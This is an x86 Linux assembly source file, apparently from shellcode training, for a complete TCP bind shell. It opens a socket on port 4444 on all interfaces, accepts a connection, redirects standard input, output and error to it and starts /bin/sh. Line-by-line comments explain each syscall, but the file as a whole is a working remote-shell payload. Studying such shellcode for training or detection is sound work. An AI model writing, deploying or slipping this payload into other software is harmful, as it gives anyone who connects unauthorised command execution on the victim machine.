; Shell Bind TCP 

global _start

section .text

_start:
	
	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx


	;***************;
	; create socket ;	
	;***************;


	; syscall - 	socketcall
	mov al, 0x66
	; callid - 	socket
	mov bl, 0x1

	; push ecx = 0x0
	; push ebx = 0x1
	; 	push 0x2
	; *args = 0x2, 0x1, 0x0
	push ecx
	push ebx
	push 0x2
	
	mov ecx, esp
	int 0x80	; socket(AF_INET, SOCK_STREAM, 0)

	; store sockfd for later
	mov edi, eax


	;*************;
	; bind socket ;
	;*************;


	; syscall - 	socketcall
	mov al, 0x66

	; callid - 	bind   (increase ebx from 1 to 2)
	inc ebx

	; create struct {AF_INET, 4444, INADDR_ANY}
	push edx		; INADDR_ANY = 0x0
	push word 0x5C11	; Port 4444 htons(4444)
	push bx			; AF_INET = 0x2
	mov ecx, esp		; store pointer to struct

	; create args for bind {sockfd, struct, sizeof(struct)}
	push 0x10	; struct size = 0x10
	push ecx	; pointer to struct
	push edi	; sockfd stored from socket() call

	mov ecx, esp
	int 0x80	; bind(sockfd, sock_addr, sizeof(sock_addr))


	;**********************;
	; set socket to listen ;
	;**********************;

	; registers are prepared for args, so lets push before changing anything
	push eax	; 0x0
	push edi	; sockfd

	mov ecx, esp	

	; syscall - 	socketcall
	mov al, 0x66

	;callid - 	listen (0x4)
	inc ebx
	inc ebx
	int 0x80	; listen(sockfd, 0)


	;*******************;
	; accept connection ;
	;*******************;


	; eax is 0 from the return value of listen
	push eax	; NULL
	push eax	; NULL
	push edi	; sockfd
	mov ecx, esp

	; syscall - 	socketcall
	mov al, 0x66	
	
	; callid - 	accept
	inc ebx
	int 0x80	; accept(sockfd, NULL, NULL);


	;*****************;
	; redirect output ;
	;*****************;


	mov ebx, eax	; client_socket used for arg
	xor ecx, ecx	;
	mov cl, 0x2 
dup:
	; syscall - 	dup2 (0x3f)
	mov al, 0x3f
	int 0x80	; dup2(client_socket, x)
	dec ecx
	jns dup		; jump if positive, don't if negative


	;***************;
	; execute shell ;
	;***************;


	push edx	; 0x0
	push 0x68732f2f	; push hs//nib/    (/bin/sh in reverse order split into 4 chars each)
	push 0x6e69622f

	mov ebx, esp	; null terminated /bin//sh
	mov ecx, edx	; 0x0
	
	mov al, 0xB
	int 0x80	; execve("/bin//sh", NULL, NULL)
